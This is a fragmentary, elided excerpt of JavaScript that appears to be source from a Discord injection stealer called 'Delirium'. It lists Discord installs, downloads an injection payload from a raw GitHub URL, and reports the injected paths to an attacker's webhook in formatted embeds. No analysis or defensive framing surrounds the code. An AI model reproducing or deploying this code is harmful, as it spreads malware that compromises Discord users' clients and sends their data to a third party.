...
listDiscords();
function Infect() {
    https.get('https://raw.githubusercontent.com/dotnoxty/delirium.gg/main/delirium/Injection/injection', (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
...
function injectNotify() {
    ...
    injectPath.forEach( path => {
        var c = {
            name: "<a:gengar:930675542703878184> Delirium Inject",
            value: `\`\`\`${path}\`\`\``,
            inline: !1
        }
        fields.push(c)
	...
	.post(webhook, {
        ...
        "embeds": [
          {
            "title": "<:xpill:930676804627337277> Injection",
